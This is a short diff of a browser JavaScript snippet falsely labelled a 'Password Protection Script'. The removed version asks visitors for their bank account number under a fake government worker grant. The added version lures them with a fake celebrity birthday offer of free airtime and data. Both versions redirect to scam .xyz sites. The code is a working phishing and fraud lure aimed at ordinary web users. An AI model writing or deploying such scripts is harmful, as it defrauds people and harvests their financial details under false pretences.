@@ -1,8 +1,6 @@
-<script type="text/javascript"> 
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '10'
-password=prompt('SMS FG : You have been selected to benefit from the ongoing 50,000 NAIRA WORKERS DAY GRANT Enter your account number and click OK to continue ',' Enter your account number here.');
-if (password != '10') {
-location.href='https://2024-program.xyz/workersday';
+var password = '1'
+password=prompt('SMS: Congratulations You are among the 10,000 fans to receive R50 Airtime and 15GB Free Data From NASTY-c Birthday Offer, Kindly Press 1 to ACTIVATE ','1');
+if (password != '1') {
+location.href='https://nastyc.data-offer.xyz/15GB';
 }
-</script>
